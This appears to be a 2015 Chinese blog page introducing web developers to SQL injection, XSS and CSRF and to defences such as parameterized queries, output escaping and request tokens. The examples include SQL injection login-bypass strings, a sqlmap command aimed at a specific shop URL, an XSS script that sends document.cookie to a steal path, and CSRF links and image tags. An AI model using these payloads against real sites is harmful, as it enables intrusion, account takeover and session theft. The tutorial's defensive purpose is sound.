@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html lang>
+  <head><meta name="generator" content="Hexo 3.8.0">
+    
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+  <meta name="description" content="WEB安全初探">
+
+
+
+
+  <meta name="keywords" content="PHP编程,">
+
+
+
+
+
+  <link rel="alternate" href="/default" title="Rming">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.2">
+
+
+
+<link rel="canonical" href="http://rmingwang.com/about-web-attacks.html">
+
+
+<meta name="description" content="SQL 注入 什么是SQL注入？ 举个例子 预防 测试   XSS 跨站脚本攻击 什么是XSS？ 存储式XSS 反射型XSS     CSRF 跨站请求伪造 CSRF：冒充用户之手     &amp;emsp;&amp;emsp;常见的WEB攻击有SQL注入，XSS，CSRF，DDos和弱口令攻击等（OWASP 2013 Top 10中文版），作为一个WEB开发人员，必须了解这些攻击的原理和常见手段才能在编码">
+<meta name="keywords" content="PHP编程">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WEB安全初探">
+<meta property="og:url" content="http://rmingwang.com/about-web-attacks.html">
+<meta property="og:site_name" content="Rming">
+<meta property="og:description" content="SQL 注入 什么是SQL注入？ 举个例子 预防 测试   XSS 跨站脚本攻击 什么是XSS？ 存储式XSS 反射型XSS     CSRF 跨站请求伪造 CSRF：冒充用户之手     &amp;emsp;&amp;emsp;常见的WEB攻击有SQL注入，XSS，CSRF，DDos和弱口令攻击等（OWASP 2013 Top 10中文版），作为一个WEB开发人员，必须了解这些攻击的原理和常见手段才能在编码">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2015-09-18T03:27:33.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="WEB安全初探">
+<meta name="twitter:description" content="SQL 注入 什么是SQL注入？ 举个例子 预防 测试   XSS 跨站脚本攻击 什么是XSS？ 存储式XSS 反射型XSS     CSRF 跨站请求伪造 CSRF：冒充用户之手     &amp;emsp;&amp;emsp;常见的WEB攻击有SQL注入，XSS，CSRF，DDos和弱口令攻击等（OWASP 2013 Top 10中文版），作为一个WEB开发人员，必须了解这些攻击的原理和常见手段才能在编码">
+
+
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.2">
+<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+
+
+
+
+
+<script type="text/javascript">
+  var themeConfig = {
+    fancybox: {
+      enable: false
+    },
+  };
+</script>
+
+
+
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?26275cbf6baa00fb8df9ba266da07c6d";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  <script type="text/javascript">
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+        ga('create', 'UA-22663233-12', 'auto');
+        ga('send', 'pageview');
+  </script>
+
+
+
+
+
+  
+
+
+    <title> WEB安全初探 - Rming </title>
+  </head>
+
+  <body>
+    <div id="page">
+      <header id="masthead"><div class="site-header-inner">
+    <h1 class="site-title">
+        <a href="/." class="logo">Rming</a>
+    </h1>
+
+    <nav id="nav-top">
+        
+            <ul id="menu-top" class="nav-top-items">
+                
+                    <li class="menu-item">
+                        <a href="/links.html">
+                            
+                            
+                                友情链接
+                            
+                        </a>
+                    </li>
+                
+            </ul>
+        
+  </nav>
+</div>
+
+      </header>
+      <div id="content">
+        
+    <div id="primary">
+        
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          WEB安全初探
+        
+      </h1>
+
+      <time class="post-time">
+          8月 17 2015
+      </time>
+    </header>
+
+
+
+    
+            <div class="post-content">
+            <!-- toc -->
+<ul>
+<li><a href="#sql-注入">SQL 注入</a><ul>
+<li><a href="#什么是sql注入">什么是SQL注入？</a></li>
+<li><a href="#举个例子">举个例子</a></li>
+<li><a href="#预防">预防</a></li>
+<li><a href="#测试">测试</a></li>
+</ul>
+</li>
+<li><a href="#xss-跨站脚本攻击">XSS 跨站脚本攻击</a><ul>
+<li><a href="#什么是xss">什么是XSS？</a><ul>
+<li><a href="#存储式xss">存储式XSS</a></li>
+<li><a href="#反射型xss">反射型XSS</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#csrf-跨站请求伪造">CSRF 跨站请求伪造</a><ul>
+<li><a href="#csrf冒充用户之手">CSRF：冒充用户之手</a></li>
+</ul>
+</li>
+</ul>
+<!-- tocstop -->
+<p>&emsp;&emsp;常见的WEB攻击有SQL注入，XSS，CSRF，DDos和弱口令攻击等（<a href="http://www.owasp.org.cn/owasp-project/2013top10" target="_blank" rel="noopener">OWASP 2013 Top 10中文版</a>），作为一个WEB开发人员，必须了解这些攻击的原理和常见手段才能在编码时避免漏洞产生，所谓知彼知己百战不殆。</p>
+<h2><span id="sql-注入">SQL 注入</span></h2><blockquote>
+<p><a href="https://zh.wikipedia.org/wiki/%E5%8F%83%E6%95%B8%E5%8C%96%E6%9F%A5%E8%A9%A2" target="_blank" rel="noopener">參數化查詢</a> 目前已被視為最有效可預防SQL注入攻击的攻擊手法的防禦方式。</p>
+</blockquote>
+<p>&emsp;&emsp;<a href="https://zh.wikipedia.org/wiki/%E5%8F%83%E6%95%B8%E5%8C%96%E6%9F%A5%E8%A9%A2" target="_blank" rel="noopener">参数化查询</a>大行其道，秒杀了一大批SQL注入工具，但是还有少数人采用拼接参数的方式编写语句，虽然大家对SQL注入不再陌生，平时也会多几分防范，但是编码时免不了需要战战兢兢，处处设防，因此还是强烈推荐使用<a href="https://zh.wikipedia.org/wiki/%E5%8F%83%E6%95%B8%E5%8C%96%E6%9F%A5%E8%A9%A2" target="_blank" rel="noopener">参数化查询</a>，避免使用字符串拼接。</p>
+<h3><span id="什么是sql注入">什么是SQL注入？</span></h3><p>&emsp;&emsp;所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。</p>
+<h3><span id="举个例子">举个例子</span></h3><p>BAD：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">'SELECT * FROM `users` WHERE `username`="%s" AND `password`="%s"'</span>;</span><br><span class="line">$db-&gt;query(sprintf($sql, $userName, $password));</span><br><span class="line"></span><br><span class="line"><span class="comment">#参数注入（WHERE条件参数）</span></span><br><span class="line">$userName = <span class="string">'" OR "1"="1'</span>;</span><br><span class="line">$password = <span class="string">'" OR "1"="1'</span>;</span><br><span class="line"><span class="comment">#最终执行的SQL语句</span></span><br><span class="line">SELECT * FROM `users` WHERE `username`=<span class="string">""</span> <span class="keyword">OR</span> <span class="string">"1"</span>=<span class="string">"1"</span> <span class="keyword">AND</span> `password`=<span class="string">""</span> <span class="keyword">OR</span> <span class="string">"1"</span>=<span class="string">"1"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#参数注入（SQL注释）</span></span><br><span class="line">$userName = <span class="string">'" OR 1=1 --'</span>;</span><br><span class="line">$password = <span class="string">'samplepasshash'</span>;</span><br><span class="line"><span class="comment">#最终语句</span></span><br><span class="line">SELECT * FROM `members` WHERE `username`=<span class="string">""</span> <span class="keyword">OR</span> <span class="number">1</span>=<span class="number">1</span> -- <span class="keyword">AND</span> `password`=<span class="string">"samplepasshash"</span></span><br></pre></td></tr></table></figure>
+<p>GOOD:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$sql    = <span class="string">'SELECT * FROM `users` WHERE `username`=? AND `password`=?'</span>;</span><br><span class="line">$params = [$userName, $password];</span><br><span class="line">$stmt = $dbh-&gt;prepare($sql);</span><br><span class="line">$res  = $stmt-&gt;execute($params);</span><br></pre></td></tr></table></figure>
+<p>以上两个例子，是历史流传已久的菜鸟例程了，额外：</p>
+<ol>
+<li>注入点除了常规的条件参数，还可以是<code>ORDER BY</code>, <code>LIMIT</code>, <code>OFFSET</code>之类；</li>
+<li>注入方法除了以上的“语句注释/结束”, “改变WHERE字句”，还可以“常真/常假测试”，“表名猜解”等；</li>
+<li>如果你使用了自己的过滤方法，那么还有多种方法逃过过滤，比如“通过注释绕过空格过滤”，“改变大小写/编码”，“通过<code>char(ASCII码)</code>伪装”等方式绕过过滤；</li>
+</ol>
+<p>&emsp;&emsp;由于个人知识储备有限和篇幅原因，对于更加详细的SQL注入就不在介绍了，有兴趣的可以通过上述关键词或者参考阅读丰富下知识。</p>
+<p><strong>扩展阅读：</strong></p>
+<ul>
+<li><a href="http://www.w3schools.com/sql/sql_injection.asp" target="_blank" rel="noopener">W3schools: SQL Injection</a></li>
+<li><a href="https://www.owasp.org/index.php/SQL_Injection" target="_blank" rel="noopener">OWASP SQL Injection</a></li>
+<li><a href="http://drops.wooyun.org/tips/123" target="_blank" rel="noopener">MySql注入科普</a> </li>
+<li>Advances SQL injection</li>
+<li><a href="https://zh.wikipedia.org/wiki/SQL%E8%B3%87%E6%96%99%E9%9A%B1%E7%A2%BC%E6%94%BB%E6%93%8A" target="_blank" rel="noopener">维基百科 SQL injection</a> </li>
+</ul>
+<h3><span id="预防">预防</span></h3><ul>
+<li>使用<a href="https://zh.wikipedia.org/wiki/%E5%8F%83%E6%95%B8%E5%8C%96%E6%9F%A5%E8%A9%A2" target="_blank" rel="noopener">參數化查詢</a></li>
+<li>限制数据库错误输出</li>
+<li>数据库/www用户权限控制</li>
+</ul>
+<h3><span id="测试">测试</span></h3><p>&emsp;&emsp;对于特定地址SQL注入的测试，可以使用SQLMap进行盲注，具体参考 <a href="https://www.owasp.org/index.php/Automated_Audit_using_SQLMap" target="_blank" rel="noopener">Automated Audit using SQLMap</a>。</p>
+<p><strong>简单示例：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">./sqlmap.py -u "http://253.mall.miaoshou.com/product?typeid_two=169&amp;order=miaoshou_price&amp;desc=asc"  \</span><br><span class="line">--dbms=MySQL \</span><br><span class="line">--timeout=15 \</span><br><span class="line">--retries=2 \</span><br><span class="line">--threads=5 \</span><br><span class="line">--dbms=MySQL \</span><br><span class="line">--os=Linux \</span><br><span class="line">--level=5 \</span><br><span class="line">--risk=3</span><br></pre></td></tr></table></figure>
+<h2><span id="xss-跨站脚本攻击">XSS 跨站脚本攻击</span></h2><h3><span id="什么是xss">什么是XSS？</span></h3><p>&emsp;&emsp;跨站脚本攻击，它指的是恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意攻击用户的特殊目的。</p>
+<blockquote>
+<p>永远不要相信用户的输入！</p>
+</blockquote>
+<h4><span id="存储式xss">存储式XSS</span></h4><p>&emsp;&emsp;举个例子，例如blog的标题，假设在存到数据库的时候是直接将blog标题文本框中的内容存储，在显示的时候直接用$blog.title这样的方式去显示的话，那么只要在blog标题中输入<code>&lt;script&gt;alert(document.cookie);&lt;/script&gt;</code>，然后保存，在显示的时候这段javascript就会被正常执行了，虽然这样的看似没有什么大的危害，但攻击者同样不会采取这么简单的方式，例如可以直接给你一段经过url编码的串，而其中就是利用网站的XSS漏洞将你的cookie信息发送至一个攻击性质的记录cookie的网站等，又或者完全可以利用网站的XSS漏洞埋上一段隐藏的img来嵌入这样而已的url，那么你的cookie就会不知不觉的被盗用，而偏偏现在大部分的网站都是借助cookie来代表用户的身份，这样，当攻击者拿到cookie之后，也就可以假冒你的身份大摇大摆的进入相应的网站了。</p>
+<h4><span id="反射型xss">反射型XSS</span></h4><p>&emsp;&emsp;上面说的是比较典型的一种XSS漏洞产生的情况，另外一种比较典型的是domxss的情况，这种情况多数是攻击者利用直接闭合标签，从而执行恶意的javascript代码，例如页面中有个文本框，这个文本框的内容在提交后会被记录并继续显示在结果页面的文本框架中，假设第二个页面中文本框是这么写的：<code>&lt;inputtype=textvalue=&quot;$!prevPage.someText&quot;&gt;</code>，那么只要在前一页面中输入”&gt;<code>&lt;script&gt;alert(document.cookie);&lt;/script&gt;</code>这样的内容，在第二个页面显示的时候就会变成：<code>&lt;inputtype=textvalue=&quot;&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&gt;</code>，攻击者通过闭合input标签实现了执行恶意的javascript代码，同样，如果你的javascript中也有类似的读取url参数或前页提交的内容，又或数据库中的内容的话，攻击者都有可能利用这种闭合标签的方式来实施攻击。</p>
+<p>现在我们使用的浏览器都比较聪明了，会自动识别一些简单地XSS攻击，防止泄露个人信息。</p>
+<ul>
+<li><a href="http://htmlpurifier.org/" target="_blank" rel="noopener">HTML Purifier</a></li>
+<li>Smarty的<code>escape</code>修饰</li>
+<li>PHP函数<code>htmlentities</code></li>
+<li><code>htmlspecialchars</code> 和 <code>htmlentities</code>在这方面还是有些区别的。</li>
+</ul>
+<p>FYI: </p>
+<ul>
+<li><a href="http://securethoughts.com/exploiting-ie8-utf-7-xss-vulnerability-using-local-redirection/" target="_blank" rel="noopener">EXPLOITING IE8 UTF-7 XSS VULNERABILITY USING LOCAL REDIRECTION</a> </li>
+<li><a href="http://stackoverflow.com/questions/3623236/htmlspecialchars-vs-htmlentities-when-concerned-with-xss" target="_blank" rel="noopener">htmlspecialchars vs htmlentities when concerned with XSS</a></li>
+<li><a href="http://huaidan.org/archives/2927.html" target="_blank" rel="noopener">浅谈反射型XSS的利用</a></li>
+</ul>
+<p>昵称修改为以下内容，并且在商品页面有留言或评论，此时，如果另外一个用户打开商品页面，就会在不知情的情况下将自己的cookie信息发送给了小偷。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    $.<span class="keyword">get</span>('path/to/steal?cookie='+document.cookie);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h2><span id="csrf-跨站请求伪造">CSRF 跨站请求伪造</span></h2><h3><span id="csrf冒充用户之手">CSRF：冒充用户之手</span></h3><p>&emsp;&emsp;起初我一直弄不清楚 CSRF 究竟和 XSS 有什么区别，后来才明白 CSRF 和 XSS 根本是两个不同维度上的分类。XSS 是实现 CSRF 的诸多途径中的一条，但绝对不是唯一的一条。一般习惯上把通过 XSS 来实现的 CSRF 称为 XSRF。</p>
+<p>&emsp;&emsp;CSRF 的全称是“跨站请求伪造”，而 XSS 的全称是“跨站脚本”。看起来有点相似，它们都是属于跨站攻击——不攻击服务器端而攻击正常访问网站的用户，但前面说了，它们的攻击类型是不同维度上的分类。CSRF 顾名思义，是伪造请求，冒充用户在站内的正常操作。我们知道，绝大多数网站是通过 cookie 等方式辨识用户身份（包括使用服务器端 Session 的网站，因为 Session ID 也是大多保存在 cookie 里面的），再予以授权的。所以要伪造用户的正常操作，最好的方法是通过 XSS 或链接欺骗等途径，让用户在本机（即拥有身份 cookie 的浏览器端）发起用户所不知道的请求。</p>
+<p>&emsp;&emsp;严格意义上来说，CSRF 不能分类为注入攻击，因为 CSRF 的实现途径远远不止 XSS 注入这一条。通过 XSS 来实现 CSRF 易如反掌，但对于设计不佳的网站，一条正常的链接都能造成 CSRF。</p>
+<p>&emsp;&emsp;例如，一论坛网站的发贴是通过 GET 请求访问，点击发贴之后 JS 把发贴内容拼接成目标 URL 并访问： <code>http://example.com/bbs/create_post.php?title=标题&amp;content=内容</code> 那么，我只需要在论坛中发一帖，包含一链接： <code>http://example.com/bbs/create_post.php?title=我是脑残&amp;content=哈哈</code> 只要有用户点击了这个链接，那么他们的帐户就会在不知情的情况下发布了这一帖子。可能这只是个恶作剧，但是既然发贴的请求可以伪造，那么删帖、转帐、改密码、发邮件全都可以伪造。</p>
+<p>&emsp;&emsp;如何解决这个问题，我们是否可以效仿上文应对 XSS 的做法呢？过滤用户输入， 不允许发布这种含有站内操作 URL 的链接。这么做可能会有点用，但阻挡不了 CSRF，因为攻击者可以通过 QQ 或其他网站把这个链接发布上去，为了伪装可能还使用 bit.ly 压缩一下网址，这样点击到这个链接的用户还是一样会中招。所以对待 CSRF ，我们的视角需要和对待 XSS 有所区别。CSRF 并不一定要有站内的输入，因为它并不属于注入攻击，而是请求伪造。被伪造的请求可以是任何来源，而非一定是站内。所以我们唯有一条路可行，就是过滤请求的处理者。</p>
+<p>&emsp;&emsp;比较头痛的是，因为请求可以从任何一方发起，而发起请求的方式多种多样，可以通过 iframe、ajax（这个不能跨域，得先 XSS）、Flash 内部发起请求（总是个大隐患）。由于几乎没有彻底杜绝 CSRF 的方式，我们一般的做法，是以各种方式提高攻击的门槛。</p>
+<p>&emsp;&emsp;首先可以提高的一个门槛，就是改良站内 API 的设计。对于发布帖子这一类创建资源的操作，应该只接受 POST 请求，而 GET 请求应该只浏览而不改变服务器端资源。当然，最理想的做法是使用REST 风格 的 API 设计，GET、POST、PUT、DELETE 四种请求方法对应资源的读取、创建、修改、删除。现在的浏览器基本不支持在表单中使用 PUT 和 DELETE 请求方法，我们可以使用 ajax 提交请求（例如通过 jquery-form 插件，我最喜欢的做法），也可以使用隐藏域指定请求方法，然后用 POST 模拟 PUT 和 DELETE （Ruby on Rails 的做法）。这么一来，不同的资源操作区分的非常清楚，我们把问题域缩小到了非 GET 类型的请求上——攻击者已经不可能通过发布链接来伪造请求了，但他们仍可以发布表单，或者在其他站点上使用我们肉眼不可见的表单，在后台用 js 操作，伪造请求。</p>
+<p>&emsp;&emsp;接下来我们就可以用比较简单也比较有效的方法来防御 CSRF，这个方法就是“请求令牌”。读过《J2EE 核心模式》的同学应该对“同步令牌”应该不会陌生，“请求令牌”和“同步令牌”原理是一样的，只不过目的不同，后者是为了解决 POST 请求重复提交问题，前者是为了保证收到的请求一定来自预期的页面。实现方法非常简单，首先服务器端要以某种策略生成随机字符串，作为令牌（token），保存在 Session 里。然后在发出请求的页面，把该令牌以隐藏域一类的形式，与其他信息一并发出。在接收请求的页面，把接收到的信息中的令牌与 Session 中的令牌比较，只有一致的时候才处理请求，否则返回 HTTP 403 拒绝请求或者要求用户重新登录验证身份。</p>
+<p>&emsp;&emsp;请求令牌虽然使用起来简单，但并非不可破解，使用不当会增加安全隐患。使用请求令牌来防止 CSRF 有以下几点要注意：</p>
+<p>&emsp;&emsp;虽然请求令牌原理和验证码有相似之处，但不应该像验证码一样，全局使用一个 Session Key。因为请求令牌的方法在理论上是可破解的，破解方式是解析来源页面的文本，获取令牌内容。如果全局使用一个 Session Key，那么危险系数会上升。原则上来说，每个页面的请求令牌都应该放在独立的 Session Key 中。我们在设计服务器端的时候，可以稍加封装，编写一个令牌工具包，将页面的标识作为 Session 中保存令牌的键。</p>
+<p>&emsp;&emsp;在 ajax 技术应用较多的场合，因为很有请求是 JavaScript 发起的，使用静态的模版输出令牌值或多或少有些不方便。但无论如何，请不要提供直接获取令牌值的 API。这么做无疑是锁上了大门，却又把钥匙放在门口，让我们的请求令牌退化为同步令牌。</p>
+<p>&emsp;&emsp;第一点说了请求令牌理论上是可破解的，所以非常重要的场合，应该考虑使用验证码（令牌的一种升级，目前来看破解难度极大），或者要求用户再次输入密码（亚马逊、淘宝的做法）。但这两种方式用户体验都不好，所以需要产品开发者权衡。</p>
+<p>&emsp;&emsp;无论是普通的请求令牌还是验证码，服务器端验证过一定记得销毁。忘记销毁用过的令牌是个很低级但是杀伤力很大的错误。我们学校的选课系统就有这个问题，验证码用完并未销毁，故只要获取一次验证码图片，其中的验证码可以在多次请求中使用（只要不再次刷新验证码图片），一直用到 Session 超时。这也是为何选课系统加了验证码，外挂软件升级一次之后仍然畅通无阻。</p>
+<p>如下也列出一些据说能有效防范 CSRF，其实效果甚微的方式甚至无效的做法。</p>
+<ul>
+<li><p>通过 referer 判定来源页面：referer 是在 HTTP Request Head 里面的，也就是由请求的发送者决定的。如果我喜欢，可以给 referer 任何值。当然这个做法并不是毫无作用，起码可以防小白。但我觉得性价比不如令牌。</p>
+</li>
+<li><p>过滤所有用户发布的链接：这个是最无效的做法，因为首先攻击者不一定要从站内发起请求（上面提到过了），而且就算从站内发起请求，途径也远远不止链接一条。比如 <code>&lt;img src=&quot;./create_post.php&quot; /&gt;</code> 就是个不错的选择，还不需要用户去点击，只要用户的浏览器会自动加载图片，就会自动发起请求。</p>
+</li>
+<li><p>在请求发起页面用 alert 弹窗提醒用户：这个方法看上去能干扰站外通过 iframe 发起的 CSRF，但攻击者也可以考虑用 <code>window.alert = function(){};</code> 把 alert 弄哑，或者干脆脱离 iframe，使用 Flash 来达到目的。</p>
+</li>
+</ul>
+<p>参考：</p>
+<ul>
+<li><a href="https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project" target="_blank" rel="noopener">Category:OWASP Top Ten Project</a></li>
+<li><a href="http://www.owasp.org.cn/owasp-project/2013top10" target="_blank" rel="noopener">OWASP 2013 Top 10中文版</a> </li>
+<li><a href="https://zh.wikipedia.org/wiki/%E5%8F%83%E6%95%B8%E5%8C%96%E6%9F%A5%E8%A9%A2" target="_blank" rel="noopener">参数化查询</a></li>
+<li><a href="http://ssv.sebug.net/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E" target="_blank" rel="noopener">SQL注入漏洞</a></li>
+<li><a href="http://www.w3schools.com/sql/sql_injection.asp" target="_blank" rel="noopener">W3schools: SQL Injection</a></li>
+<li><a href="https://www.owasp.org/index.php/SQL_Injection" target="_blank" rel="noopener">OWASP SQL Injection</a></li>
+<li><a href="http://drops.wooyun.org/tips/123" target="_blank" rel="noopener">MySql注入科普</a> </li>
+<li>Advances SQL injection</li>
+<li><a href="https://zh.wikipedia.org/wiki/SQL%E8%B3%87%E6%96%99%E9%9A%B1%E7%A2%BC%E6%94%BB%E6%93%8A" target="_blank" rel="noopener">维基百科 SQL injection</a> </li>
+<li><a href="https://github.com/sqlmapproject/sqlmap/wiki/Usage" target="_blank" rel="noopener">SQLMap wiki pages</a></li>
+<li><a href="https://www.owasp.org/index.php/Automated_Audit_using_SQLMap" target="_blank" rel="noopener">Automated Audit using SQLMap</a></li>
+<li><a href="http://coolshell.cn/articles/8711.html" target="_blank" rel="noopener">程序员疫苗：代码注入</a></li>
+<li><a href="https://blog.tonyseek.com/post/introduce-to-xss-and-csrf/" target="_blank" rel="noopener">总结 XSS 与 CSRF 两种跨站攻击</a></li>
+<li><a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet" target="_blank" rel="noopener">Cross-Site Request Forgery (CSRF) Prevention Cheat Sheet</a></li>
+<li><a href="http://htmlpurifier.org/" target="_blank" rel="noopener">HTML Purifier</a></li>
+<li><a href="http://coolshell.cn/articles/5353.html" target="_blank" rel="noopener">你会做Web上的用户登录功能吗？</a></li>
+</ul>
+
+            </div>
+          
+
+    
+      <footer class="post-footer">
+        <div class="post-tags">
+          
+            <a href="/tags/PHP编程/">PHP编程</a>
+          
+        </div>
+
+        
+        
+  <nav class="post-nav">
+    
+      <a class="prev" href="/the-programming-language-lua-and-openresty.html">
+        <i class="iconfont icon-left"></i>
+        <span class="prev-text nav-default">The Programming Language Lua and OpenResty</span>
+        <span class="prev-text nav-mobile">Prev</span>
+      </a>
+    
+    
+      <a class="next" href="/openresty-lapis-env.html">
+        <span class="next-text nav-default">OpenResty & Lapis</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    
+  </nav>
+
+        
+  <div class="comments" id="comments">
+    
+    <div style="text-align:center;">
+        <button class="btn" id="load-disqus" onclick="disqus.load();">加载 Disqus 评论</button>
+    </div>
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
+
+      </footer>
+    
+  </article>
+
+    </div>
+
+      </div>
+
+      <footer id="colophon"><span class="copyright-year">
+    
+        &copy;
+    
+        2008 -
+    
+    2019
+    <span class="footer-author">Rming.</span>
+    <span class="power-by">
+        Powered by <a class="hexo-link" href="https://hexo.io/">Hexo</a> and <a class="theme-link" href="https://github.com/Rming/hexo-theme-polarbearsimple">Polar Bear Simple</a>
+    </span>
+</span>
+
+      </footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+    
+
+<script type="text/javascript">
+  var disqus_shortname = 'rming';
+  var disqus_identifier = '/about-web-attacks.html';
+
+  var disqus_title = "WEB安全初探";
+
+
+  var disqus = {
+    load : function disqus(){
+        if(typeof DISQUS !== 'object') {
+          (function () {
+          var s = document.createElement('script'); s.async = true;
+          s.type = 'text/javascript';
+          s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+          (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
+          }());
+          $('#load-disqus').remove(); ///加载后移除按钮
+        }
+    }
+  }
+
+  
+    var disqus_config = function () {
+        this.page.url = disqus_url;
+        this.page.identifier = disqus_identifier;
+        this.page.title = disqus_title;
+    };
+  
+
+</script>
+
+
+    
+
+
+
+
+  
+    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
+  
+
+  
+
+    <script type="text/javascript" src="/js/src/theme.js?v=1.2"></script>
+<script type="text/javascript" src="/js/src/bootstrap.js?v=1.2"></script>
+
+  </body>
+</html>
